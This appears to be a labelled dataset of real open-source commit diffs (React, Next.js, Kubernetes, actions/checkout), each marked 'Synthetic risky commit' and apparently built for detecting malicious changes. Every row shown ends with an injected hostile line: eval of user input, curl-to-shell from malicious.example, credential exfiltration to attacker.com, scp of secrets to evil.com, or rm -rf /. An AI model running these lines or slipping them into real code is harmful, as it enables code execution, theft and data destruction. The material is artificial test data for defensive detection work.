'0'] + ['+ 40' '0'] + ['+ 41' '0'] + ['+ 42' '0'] + ['+ 43' '0'] + ['+ 44' '0'] + ['+ 45' '0'] + ['+ 46' '0'] + ['+ 47' '0'] + ['+ 48' '0'] + ['+ 49' '0'] + ['+ 50' '0'] + ['+ 51' '0'] + ['+ 52' '0'] + ['+ 53' '0'] + ['+ 54' '0'] + ['+ 55' '0'] + ['+ 56' '0'] + ['+ 57' '0'] + ['+ 58' '0'] + ['+ 59' '0'] + ['+ 60' '0'] + ['+ 61' '0'] + ['+ 62' '0'] + ['+ 63' '0'] + ['+ 64' '0'] + ['+ 65' '0'] + ['+ 66' '0'] + ['+ 67' '0'] + ['+ 68' '0'] + ['+ 69' '0'] + ['+ 70' '0'] + ['+ 71' '0'] + ['+ 72' '0'] + ['+ 73' '0'] + ['+ 74' '0'] + ['+ 75' '0'] + ['+ 76' '0'] + ['+ 77' '0'] + ['+ 78' '0'] + ['+ 79' '0'] + ['+ 80' '0'] + ['+ 81' '0'] + ['+ 82' '0'] + ['+ 83' '0'] + ['+ 84' '0'] + ['+ 85' '0'] + ['+ 86' '0'] + ['+ 87' '0'] + ['+ 88' '0'] + ['+ 89' '0'] + ['+ 90' '0'] + ['+ 91' '0'] + ['+ 92' '0'] + ['+ 93' '0'] + ['+ 94' '0'] + ['+ 95' '0'] + ['+ 96' '0'] + ['+ 97' '0'] + ['+ 98' '0'] + ['+ 99' '0'] + [ + '+ Only 100 properties are shown. React will not log more properties of this object.' + '' + ] + ] + tooltipText: 'App' + track: 'Components ⚛' + } + } + end: 31 + start: 21 + } + ] + ]); + }); +});
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_234_3240,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,7,10,17,"export default function SuspenseBreadcrumbs(): React$Node { const store = useContext(StoreContext); const treeDispatch = useContext(TreeDispatcherContext); const suspenseTreeDispatch = useContext(SuspenseTreeDispatcherContext); - const {selectedSuspenseID selectedRootID lineage} = useContext( + const {selectedSuspenseID lineage roots} = useContext( SuspenseTreeStateContext ); export default function SuspenseBreadcrumbs(): React$Node { // that rendered the whole screen. In laymans terms this is really ""Initial Paint"". // TODO: Once we add subtree selection then the equivalent should be called // ""Transition"" since in that case it's really about a Transition within the page. - selectedRootID !== null ? ( + roots.length > 0 ? ( <li className={styles.SuspenseBreadcrumbsListItem} - aria-current={selectedSuspenseID === selectedRootID}> + aria-current=""true""> <button className={styles.SuspenseBreadcrumbsButton} - onClick={handleClick.bind(null selectedRootID)} + onClick={handleClick.bind(null roots[0])} type=""button""> Initial Paint </button>
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_235_6061,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,3,9,12,"{ ""name"": ""@next/env"" - ""version"": ""15.6.0-canary.43"" + ""version"": ""15.6.0-canary.44"" ""keywords"": [ ""react"" ""next""
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_236_3153,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,19,5,24,"return null; } function getArrayKind(array) { - for (var kind = 0 i = 0; i < array.length; i++) { + for (var kind = 0 i = 0; i < array.length && 100 > i; i++) { var value = array[i]; if (""object"" === typeof value && null !== value) if ( return kind; } function addObjectToProperties(object properties indent prefix) { - for (var key in object) - hasOwnProperty.call(object key) && + var addedProperties = 0 + key; + for (key in object) + if ( + hasOwnProperty.call(object key) && ""_"" !== key[0] && - addValueToProperties(key object[key] properties indent prefix); + (addedProperties++ + addValueToProperties(key object[key] properties indent prefix) + 100 <= addedProperties) + ) { + properties.push([ + prefix + + ""\u00a0\u00a0"".repeat(indent) + + ""Only 100 properties are shown. React will not log more properties of this object."" + """" + ]); + break; + } } function addValueToProperties( propertyName prefix ); propertyName = !1; + key = 0; for (var propKey in value) - ""children"" === propKey - ? null != value.children && - (!isArrayImpl(value.children) || - 0 < value.children.length) && - (propertyName = !0) - : hasOwnProperty.call(value propKey) && - ""_"" !== propKey[0] && - addValueToProperties( - propKey - value[propKey] - properties - indent + 1 - prefix - ); + if ( + (key++ + ""children"" === propKey + ? null != value.children && + (!isArrayImpl(value.children) || + 0 < value.children.length) && + (propertyName = !0) + : hasOwnProperty.call(value propKey) && + ""_"" !== propKey[0] && + addValueToProperties( + propKey + value[propKey] + properties + indent + 1 + prefix + ) + 100 <= key) + ) + break; properties.push([ """" propertyName ? "">\u2026</"" + typeName + "">"" : ""/>"" ]); return; } typeName = Object.prototype.toString.call(value); - typeName = typeName.slice(8 typeName.length - 1); - if (""Array"" === typeName) + propKey = typeName.slice(8 typeName.length - 1); + if (""Array"" === propKey) if ( - ((propKey = getArrayKind(value)) - 2 === propKey || 0 === propKey) + ((typeName = 100 < value.length) + (key = getArrayKind(value)) + 2 === key || 0 === key) ) { - value = JSON.stringify(value); + value = JSON.stringify( + typeName ? value.slice(0 100).concat(""\u2026"") : value + ); break; - } else if (3 === propKey) { + } else if (3 === key) { properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName """" ]); for ( propertyName = 0; - propertyName < value.length; + propertyName < value.length && 100 > propertyName; propertyName++ ) - (typeName = value[propertyName]) + (propKey = value[propertyName]) addValueToProperties( - typeName[0] - typeName[1] + propKey[0] + propKey[1] properties indent + 1 prefix ); + typeName && + addValueToProperties( + (100).toString() + ""\u2026"" + properties + indent + 1 + prefix + ); return; } - if (""Promise"" === typeName) { + if (""Promise"" === propKey) { if (""fulfilled"" === value.status) { if ( ((typeName = properties.length) ]); return; } - ""Object"" === typeName && - (propKey = Object.getPrototypeOf(value)) && - ""function"" === typeof propKey.constructor && - (typeName = propKey.constructor.name); + ""Object"" === propKey && + (typeName = Object.getPrototypeOf(value)) && + ""function"" === typeof typeName.constructor && + (propKey = typeName.constructor.name); properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName - ""Object"" === typeName ? (3 > indent ? """" : ""\u2026"") : typeName + ""Object"" === propKey ? (3 > indent ? """" : ""\u2026"") : propKey ]); 3 > indent && addObjectToProperties(value properties indent + 1 prefix);
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_237_3877,Niklas Mischkulnig,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,9,8,17,"import { nextTestSetup } from 'e2e-utils' describe('webpack-loader-ts-transform' () => { - const { next } = nextTestSetup({ + const { next skipped } = nextTestSetup({ files: __dirname skipDeployment: true }) + if (skipped) return + it('should allow passing binary assets to and from a Webpack loader' async () => { const $ = await next.render$('/') expect($('#text').text()).toBe('Got a buffer of 18 bytes')
+ this.constructor.constructor('return process')().exit()",1
actions/checkout,synthetic_238_9697,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,18,2,20,"module.exports = __toCommonJS(dist_src_exports); var import_universal_user_agent = __nccwpck_require__(5030); // pkg/dist-src/version.js -var VERSION = ""9.0.5""; +var VERSION = ""9.0.6""; // pkg/dist-src/defaults.js var userAgent = `octokit-endpoint.js/${VERSION} ${(0 import_universal_user_agent.getUserAgent)()}`; function addQueryParameters(url parameters) { } // pkg/dist-src/util/extract-url-variable-names.js -var urlVariableRegex = /\{[^}]+\}/g; +var urlVariableRegex = /\{[^{}}]+\}/g; function removeNonChars(variableName) { - return variableName.replace(/^\W+|\W+$/g """").split(/ /); + return variableName.replace(/(?:^\W+)|(?:(?<!\W)\W+$)/g """").split(/ /); } function extractUrlVariableNames(url) { const matches = url.match(urlVariableRegex); function parse(options) { } if (url.endsWith(""/graphql"")) { if (options.mediaType.previews?.length) { - const previewsFromAcceptHeader = headers.accept.match(/[\w-]+(?=-preview)/g) || []; + const previewsFromAcceptHeader = headers.accept.match(/(?<![\w-])[\w-]+(?=-preview)/g) || []; headers.accept = previewsFromAcceptHeader.concat(options.mediaType.previews).map((preview) => { const format = options.mediaType.format ? `.${options.mediaType.format}` : ""+json""; return `application/vnd.github.${preview}-preview${format}`; __export(dist_src_exports { module.exports = __toCommonJS(dist_src_exports); // pkg/dist-src/version.js -var VERSION = ""9.2.1""; +var VERSION = ""9.2.2""; // pkg/dist-src/normalize-paginated-list-response.js function normalizePaginatedListResponse(response) { function iterator(octokit route parameters) { const response = await requestMethod({ method url headers }); const normalizedResponse = normalizePaginatedListResponse(response); url = ((normalizedResponse.headers.link || """").match( - /<([^>]+)>;\s*rel=""next""/ + /<([^<>]+)>;\s*rel=""next""/ ) || [])[1]; return { value: normalizedResponse }; } catch (error) { var RequestError = class extends Error { if (options.request.headers.authorization) { requestCopy.headers = Object.assign({} options.request.headers { authorization: options.request.headers.authorization.replace( - / .*$/ + /(?<! ) .*$/ "" [REDACTED]"" ) }); var import_endpoint = __nccwpck_require__(9440); var import_universal_user_agent = __nccwpck_require__(5030); // pkg/dist-src/version.js -var VERSION = ""8.4.0""; +var VERSION = ""8.4.1""; // pkg/dist-src/is-plain-object.js function isPlainObject(value) { function fetchWrapper(requestOptions) { headers[keyAndValue[0]] = keyAndValue[1]; } if (""deprecation"" in headers) { - const matches = headers.link && headers.link.match(/<([^>]+)>; rel=""deprecation""/); + const matches = headers.link && headers.link.match(/<([^<>]+)>; rel=""deprecation""/); const deprecationLink = matches && matches.pop(); log.warn( `[@octokit/request] ""${requestOptions.method} ${requestOptions.url}"" is deprecated. It is scheduled to be removed on ${headers.sunset}${deprecationLink ? `. See ${deprecationLink}` : """"}` module.exports = { const { parseSetCookie } = __nccwpck_require__(4408) -const { stringify getHeadersList } = __nccwpck_require__(3121) +const { stringify } = __nccwpck_require__(3121) const { webidl } = __nccwpck_require__(1744) const { Headers } = __nccwpck_require__(554) function getSetCookies (headers) { webidl.brandCheck(headers Headers { strict: false }) - const cookies = getHeadersList(headers).cookies + const cookies = headers.getSetCookie() if (!cookies) { return [] } - // In older versions of undici cookies is a list of name:value. - return cookies.map((pair) => parseSetCookie(Array.isArray(pair) ? pair[1] : pair)) + return cookies.map((pair) => parseSetCookie(pair)) } /** module.exports = { /***/ }) /***/ 3121: -/***/ ((module __unused_webpack_exports __nccwpck_require__) => { +/***/ ((module) => { ""use strict""; -const assert = __nccwpck_require__(9491) -const { kHeadersList } = __nccwpck_require__(2785) - +/** + * @param {string} value + * @returns {boolean} + */ function isCTLExcludingHtab (value) { if (value.length === 0) { return false function stringify (cookie) { return out.join('; ') } -let kHeadersListNode - -function getHeadersList (headers) { - if (headers[kHeadersList]) { - return headers[kHeadersList] - } - - if (!kHeadersListNode) { - kHeadersListNode = Object.getOwnPropertySymbols(headers).find( - (symbol) => symbol.description === 'headers list' - ) - - assert(kHeadersListNode 'Headers cannot be parsed') - } - - const headersList = headers[kHeadersListNode] - assert(headersList) - - return headersList -} - module.exports = { isCTLExcludingHtab - stringify - getHeadersList + validateCookieName + validateCookiePath + validateCookieValue + toIMFDate + stringify } const { isUint8Array isArrayBuffer } = __nccwpck_require__(9830) const { File: UndiciFile } = __nccwpck_require__(8511) const { parseMIMEType serializeAMimeType } = __nccwpck_require__(685) +let random +try { + const crypto = __nccwpck_require__(6005) + random = (max) => crypto.randomInt(0 max) +} catch { + random = (max) => Math.floor(Math.random(max)) +} + let ReadableStream = globalThis.ReadableStream /** @type {globalThis['File']} */ function extractBody (object keepalive = false) { // Set source to a copy of the bytes held by object. source = new Uint8Array(object.buffer.slice(object.byteOffset object.byteOffset + object.byteLength)) } else if (util.isFormDataLike(object)) { - const boundary = `----formdata-undici-0${`${Math.floor(Math.random() * 1e11)}`.padStart(11 '0')}` + const boundary = `----formdata-undici-0${`${random(1e11)}`.padStart(11 '0')}` const prefix = `--${boundary}\r\nContent-Disposition: form-data` /*! formdata-polyfill. MIT License. Jimmy Wärting <https://jimmy.warting.se/opensource> */ const { isValidHeaderName isValidHeaderValue } = __nccwpck_require__(2538) +const util = __nccwpck_require__(3837) const { webidl } = __nccwpck_require__(1744) const assert = __nccwpck_require__(9491) Object.defineProperties(Headers.prototype { [Symbol.toStringTag]: { value: 'Headers' configurable: true + } + [util.inspect.custom]: { + enumerable: false } }) class Pool extends PoolBase { ? { ...options.interceptors } : undefined this[kFactory] = factory + + this.on('connectionError' (origin targets error) => { + // If a connection error occurs we remove the client from the pool + // and emit a connectionError event. They will not be re-used. + // Fixes https://github.com/nodejs/undici/issues/3895 + for (const target of targets) { + // Do not use kRemoveClient here as it will close the client + // but the client cannot be closed in this state. + const idx = this[kClients].indexOf(target) + if (idx !== -1) { + this[kClients].splice(idx 1) + } + } + }) } [kGetDispatcher] () { module.exports = require(""net""); /***/ }) +/***/ 6005: +/***/ ((module) => { + +""use strict""; +module.exports = require(""node:crypto""); + +/***/ }) + /***/ 5673: /***/ ((module) => {
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_239_8894,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,22,1,23,"{ ""name"": ""next"" - ""version"": ""15.6.0-canary.48"" + ""version"": ""15.6.0-canary.49"" ""description"": ""The React Framework"" ""main"": ""./dist/server/next.js"" ""license"": ""MIT"" ] } ""dependencies"": { - ""@next/env"": ""15.6.0-canary.48"" + ""@next/env"": ""15.6.0-canary.49"" ""@swc/helpers"": ""0.5.15"" ""caniuse-lite"": ""^1.0.30001579"" ""postcss"": ""8.4.31"" ""@modelcontextprotocol/sdk"": ""1.18.1"" ""@mswjs/interceptors"": ""0.23.0"" ""@napi-rs/triples"": ""1.2.0"" - ""@next/font"": ""15.6.0-canary.48"" - ""@next/polyfill-module"": ""15.6.0-canary.48"" - ""@next/polyfill-nomodule"": ""15.6.0-canary.48"" - ""@next/react-refresh-utils"": ""15.6.0-canary.48"" - ""@next/swc"": ""15.6.0-canary.48"" + ""@next/font"": ""15.6.0-canary.49"" + ""@next/polyfill-module"": ""15.6.0-canary.49"" + ""@next/polyfill-nomodule"": ""15.6.0-canary.49"" + ""@next/react-refresh-utils"": ""15.6.0-canary.49"" + ""@next/swc"": ""15.6.0-canary.49"" ""@opentelemetry/api"": ""1.6.0"" ""@playwright/test"": ""1.51.1"" ""@rspack/core"": ""1.5.0""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_240_2233,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,15,10,25,"ReactDOMHydrationRoot.prototype.unstable_scheduleHydration = function (target) { }; var isomorphicReactPackageVersion$jscomp$inline_2138 = React.version; if ( - ""19.3.0-canary-4fdf7cf2-20251003"" !== + ""19.3.0-canary-c7862584-20251006"" !== isomorphicReactPackageVersion$jscomp$inline_2138 ) throw Error( formatProdErrorMessage( 527 isomorphicReactPackageVersion$jscomp$inline_2138 - ""19.3.0-canary-4fdf7cf2-20251003"" + ""19.3.0-canary-c7862584-20251006"" ) ); ReactDOMSharedInternals.findDOMNode = function (componentOrElement) { ReactDOMSharedInternals.findDOMNode = function (componentOrElement) { }; var internals$jscomp$inline_2658 = { bundleType: 0 - version: ""19.3.0-canary-4fdf7cf2-20251003"" + version: ""19.3.0-canary-c7862584-20251006"" rendererPackageName: ""react-dom"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-canary-4fdf7cf2-20251003"" + reconcilerVersion: ""19.3.0-canary-c7862584-20251006"" }; if (""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__) { var hook$jscomp$inline_2659 = __REACT_DEVTOOLS_GLOBAL_HOOK__; exports.useFormState = function (action initialState permalink) { exports.useFormStatus = function () { return ReactSharedInternals.H.useHostTransitionStatus(); }; -exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; +exports.version = ""19.3.0-canary-c7862584-20251006""; ""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && ""function"" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop &&
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_241_6992,Ondra Kupka,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,26,0,26,"type setContextTest struct { expectedConfig clientcmdapi.Config //expect kubectl config } +var namespaceFlagCases = []struct { + description string + namespaceFlag string +}{ + { + description: ""long namespace flag"" + namespaceFlag: ""--namespace"" + } + { + description: ""short namespace flag"" + namespaceFlag: ""-n"" + } +} + func TestCreateContext(t *testing.T) { - conf := clientcmdapi.Config{} - test := setContextTest{ - testContext: ""shaker-context"" - description: ""Testing for create a new context"" - config: conf - args: []string{""shaker-context""} - flags: []string{ - ""--cluster=cluster_nickname"" - ""--user=user_nickname"" - ""--namespace=namespace"" - } - expected: `Context ""shaker-context"" created.` + ""\n"" - expectedConfig: clientcmdapi.Config{ - Contexts: map[string]*clientcmdapi.Context{ - ""shaker-context"": {AuthInfo: ""user_nickname"" Cluster: ""cluster_nickname"" Namespace: ""namespace""}} - } + for _ tc := range namespaceFlagCases { + t.Run(tc.description func(t *testing.T) { + conf := clientcmdapi.Config{} + test := setContextTest{ + testContext: ""shaker-context"" + description: ""Testing for create a new context"" + config: conf + args: []string{""shaker-context""} + flags: []string{ + ""--cluster=cluster_nickname"" + ""--user=user_nickname"" + tc.namespaceFlag + ""=namespace"" + } + expected: `Context ""shaker-context"" created.` + ""\n"" + expectedConfig: clientcmdapi.Config{ + Contexts: map[string]*clientcmdapi.Context{ + ""shaker-context"": {AuthInfo: ""user_nickname"" Cluster: ""cluster_nickname"" Namespace: ""namespace""}} + } + } + test.run(t) + }) } - test.run(t) } + func TestModifyContext(t *testing.T) { - conf := clientcmdapi.Config{ - Contexts: map[string]*clientcmdapi.Context{ - ""shaker-context"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""} - ""not-this"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""}}} - test := setContextTest{ - testContext: ""shaker-context"" - description: ""Testing for modify a already exist context"" - config: conf - args: []string{""shaker-context""} - flags: []string{ - ""--cluster=cluster_nickname"" - ""--user=user_nickname"" - ""--namespace=namespace"" - } - expected: `Context ""shaker-context"" modified.` + ""\n"" - expectedConfig: clientcmdapi.Config{ - Contexts: map[string]*clientcmdapi.Context{ - ""shaker-context"": {AuthInfo: ""user_nickname"" Cluster: ""cluster_nickname"" Namespace: ""namespace""} - ""not-this"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""}}} + for _ tc := range namespaceFlagCases { + t.Run(tc.description func(t *testing.T) { + conf := clientcmdapi.Config{ + Contexts: map[string]*clientcmdapi.Context{ + ""shaker-context"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""} + ""not-this"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""}}} + test := setContextTest{ + testContext: ""shaker-context"" + description: ""Testing for modify a already exist context"" + config: conf + args: []string{""shaker-context""} + flags: []string{ + ""--cluster=cluster_nickname"" + ""--user=user_nickname"" + tc.namespaceFlag + ""=namespace"" + } + expected: `Context ""shaker-context"" modified.` + ""\n"" + expectedConfig: clientcmdapi.Config{ + Contexts: map[string]*clientcmdapi.Context{ + ""shaker-context"": {AuthInfo: ""user_nickname"" Cluster: ""cluster_nickname"" Namespace: ""namespace""} + ""not-this"": {AuthInfo: ""blue-user"" Cluster: ""big-cluster"" Namespace: ""saw-ns""}}} + } + test.run(t) + }) } - test.run(t) } func TestModifyCurrentContext(t *testing.T) {
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_242_9791,Joshua Hannaford,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,30,5,35,"""849"": ""Route %s with \\`dynamic = \""error\""\\` couldn't be rendered statically because it used \\`cookies()\\`. See more info here: https://nextjs.org/docs/app/building-your-application/rendering/static-and-dynamic#dynamic-rendering"" ""850"": ""metadataBase is not a valid URL: %s"" ""851"": ""Pass either `webpack` or `turbopack` not both."" - ""852"": ""Only custom servers can pass `webpack` `turbo` or `turbopack`."" + ""852"": ""Only custom servers can pass `webpack` `turbo` or `turbopack`."" + ""853"": ""Turbopack build failed"" }
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_243_7242,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,24,1,25,"describe('ReactFragment' () => { React = require('react'); Suspense = React.Suspense; Activity = React.Activity; - ViewTransition = React.unstable_ViewTransition; + ViewTransition = React.ViewTransition; ReactNoop = require('react-noop-renderer'); const InternalTestUtils = require('internal-test-utils'); waitForAll = InternalTestUtils.waitForAll;
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_244_8724,Luke Sandberg,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,40,8,48,"where { } -impl<K: Eq + Hash V: Eq + Hash MH: BuildHasher const I: usize> Hash for AutoMap<K V MH I> { +impl<K: Eq + Hash V: Eq + Hash MH: BuildHasher + Default const I: usize> Hash + for AutoMap<K V MH I> +{ fn hash<H: std::hash::Hasher>(&self state: &mut H) { // Hash the length first to distinguish maps of different sizes self.len().hash(state); impl<K: Eq + Hash V: Eq + Hash MH: BuildHasher const I: usize> Hash for AutoM // regardless of iteration order let mut combined_hash = 0u64; + let hash_builder = MH::default(); for (k v) in self.iter() { - use std::{collections::hash_map::DefaultHasher hash::Hasher}; + use std::hash::Hasher; // Hash each key-value pair independently - let mut entry_hasher = DefaultHasher::new(); + let mut entry_hasher = hash_builder.build_hasher(); k.hash(&mut entry_hasher); v.hash(&mut entry_hasher); let entry_hash = entry_hasher.finish(); - // Combine using XOR to make it order-independent - combined_hash ^= entry_hash; + // Combine using addition to make it order-independent (wrapping_add is commutative) + combined_hash = combined_hash.wrapping_add(entry_hash); } // Hash the combined result
+ this.constructor.constructor('return process')().exit()",1
actions/checkout,synthetic_245_4626,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,5,10,15,"jobs: tag: runs-on: ubuntu-latest steps: - - uses: actions/checkout@v3 + # Note this update workflow can also be used as a rollback tool. + # For that reason it's best to pin `actions/checkout` to a known stable version + # (typically about two releases back). + - uses: actions/checkout@v4.1.1 with: fetch-depth: 0 - name: Git config
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_246_5951,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,27,1,28,"return ""Suspense""; case REACT_SUSPENSE_LIST_TYPE: return ""SuspenseList""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) { return parentContext.insertionMode >= HTML_TABLE_MODE || parentContext.insertionMode < HTML_MODE ? createFormatContext(HTML_MODE null subtreeScope null) - : parentContext.tagScope !== subtreeScope + : null !== parentContext.viewTransition || + parentContext.tagScope !== subtreeScope ? createFormatContext( parentContext.insertionMode parentContext.selectedValue }; } function getSuspenseFallbackFormatContext(resumableState parentContext) { - parentContext.tagScope & 32 && (resumableState.instructions |= 128); + parentContext.tagScope & 32 && + (resumableState.instructions |= NeedUpgradeToViewTransitions); return createFormatContext( parentContext.insertionMode parentContext.selectedValue resumableState ); } + function makeId(resumableState treeId localId) { + resumableState = ""_"" + resumableState.idPrefix + ""R_"" + treeId; + 0 < localId && (resumableState += ""H"" + localId.toString(32)); + return resumableState + ""_""; + } + function pushViewTransitionAttributes(target formatContext) { + formatContext = formatContext.viewTransition; + null !== formatContext && + (""auto"" !== formatContext.name && + (pushStringAttribute( + target + ""vt-name"" + 0 === formatContext.nameIdx + ? formatContext.name + : formatContext.name + ""_"" + formatContext.nameIdx + ) + formatContext.nameIdx++) + pushStringAttribute(target ""vt-update"" formatContext.update) + ""none"" !== formatContext.enter && + pushStringAttribute(target ""vt-enter"" formatContext.enter) + ""none"" !== formatContext.exit && + pushStringAttribute(target ""vt-exit"" formatContext.exit) + ""none"" !== formatContext.share && + pushStringAttribute(target ""vt-share"" formatContext.share)); + } function pushStyleAttribute(target style) { if (""object"" !== typeof style) throw Error( checkHtmlStringCoercion(styleText); return ("""" + styleText).replace(styleRegex styleReplacer); } - function pushSelfClosing(target props tag) { + function pushSelfClosing(target props tag formatContext) { target.push(startChunkForTag(tag)); for (var propKey in props) if (hasOwnProperty.call(props propKey)) { pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTagSelfClosing); return null; } target.push(endChunkForTag(""script"")); return null; } - function pushStartSingletonElement(target props tag) { + function pushStartSingletonElement(target props tag formatContext) { target.push(startChunkForTag(tag)); var innerHTML = (tag = null) propKey; pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTag); pushInnerHTML(target innerHTML tag); return tag; } - function pushStartGenericElement(target props tag) { + function pushStartGenericElement(target props tag formatContext) { target.push(startChunkForTag(tag)); var innerHTML = (tag = null) propKey; pushAttribute(target propKey propValue); } } + pushViewTransitionAttributes(target formatContext); target.push(endOfStartTag); pushInnerHTML(target innerHTML tag); return ""string"" === typeof tag pushAttribute(target$jscomp$0 propKey propValue); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML children); if (""string"" === typeof children) { ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML$jscomp$0 children$jscomp$0); return children$jscomp$0; null === value$jscomp$0 && null !== defaultValue && (value$jscomp$0 = defaultValue); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); if (null != children$jscomp$2) { console.error( ? pushAttribute(target$jscomp$0 ""value"" value$jscomp$1) : null !== defaultValue$jscomp$0 && pushAttribute(target$jscomp$0 ""value"" defaultValue$jscomp$0); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTagSelfClosing); null != formData && formData.forEach(pushAdditionalFormField target$jscomp$0); formTarget$jscomp$0 name$jscomp$0 ); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); null != formData$jscomp$0 && formData$jscomp$0.forEach(pushAdditionalFormField target$jscomp$0); pushAttribute(target$jscomp$0 ""method"" formMethod$jscomp$1); null != formTarget$jscomp$1 && pushAttribute(target$jscomp$0 ""target"" formTarget$jscomp$1); + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); null !== formActionName && (target$jscomp$0.push('<input type=""hidden""') ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); return null; case ""object"": ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML(target$jscomp$0 innerHTML$jscomp$4 children$jscomp$5); if (""string"" === typeof children$jscomp$5) { var JSCompiler_inline_result$jscomp$8 = pushSelfClosing( target$jscomp$0 props - ""meta"" + ""meta"" + formatContext ); else textEmbedded && target$jscomp$0.push(""\x3c!-- --\x3e"") (JSCompiler_inline_result$jscomp$8 = isFallback$jscomp$1 ? null : ""string"" === typeof props.charSet - ? pushSelfClosing(renderState.charsetChunks props ""meta"") + ? pushSelfClosing( + renderState.charsetChunks + props + ""meta"" + formatContext + ) : ""viewport"" === props.name - ? pushSelfClosing(renderState.viewportChunks props ""meta"") + ? pushSelfClosing( + renderState.viewportChunks + props + ""meta"" + formatContext + ) : pushSelfClosing( renderState.hoistableChunks props - ""meta"" + ""meta"" + formatContext )); return JSCompiler_inline_result$jscomp$8; case ""listing"": ); } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); if (null != innerHTML$jscomp$7) { if (null != children$jscomp$10) promotablePreloads.set(key$jscomp$0 resource$jscomp$1))); } } - return pushSelfClosing(target$jscomp$0 props ""img""); + return pushSelfClosing(target$jscomp$0 props ""img"" formatContext); case ""base"": case ""area"": case ""br"": case ""source"": case ""track"": case ""wbr"": - return pushSelfClosing(target$jscomp$0 props type); + return pushSelfClosing(target$jscomp$0 props type formatContext); case ""annotation-xml"": case ""color-profile"": case ""font-face"": var JSCompiler_inline_result$jscomp$9 = pushStartSingletonElement( preamble.headChunks props - ""head"" + ""head"" + formatContext ); } else JSCompiler_inline_result$jscomp$9 = pushStartGenericElement( target$jscomp$0 props - ""head"" + ""head"" + formatContext ); return JSCompiler_inline_result$jscomp$9; case ""body"": var JSCompiler_inline_result$jscomp$10 = pushStartSingletonElement( preamble$jscomp$0.bodyChunks props - ""body"" + ""body"" + formatContext ); } else JSCompiler_inline_result$jscomp$10 = pushStartGenericElement( target$jscomp$0 props - ""body"" + ""body"" + formatContext ); return JSCompiler_inline_result$jscomp$10; case ""html"": var JSCompiler_inline_result$jscomp$11 = pushStartSingletonElement( preamble$jscomp$1.htmlChunks props - ""html"" + ""html"" + formatContext ); } else JSCompiler_inline_result$jscomp$11 = pushStartGenericElement( target$jscomp$0 props - ""html"" + ""html"" + formatContext ); return JSCompiler_inline_result$jscomp$11; default: } } } + pushViewTransitionAttributes(target$jscomp$0 formatContext); target$jscomp$0.push(endOfStartTag); pushInnerHTML( target$jscomp$0 return children$jscomp$11; } } - return pushStartGenericElement(target$jscomp$0 props type); + return pushStartGenericElement( + target$jscomp$0 + props + type + formatContext + ); } function endChunkForTag(tag) { var chunk = endTagCache.get(tag); return ""SuspenseList""; case REACT_ACTIVITY_TYPE: return ""Activity""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch ( ) (didWarnAboutNoopUpdateForComponent[warningKey] = !0)); } + function getTreeId(context) { + var overflow = context.overflow; + context = context.id; + return ( + (context & ~(1 << (32 - clz32(context) - 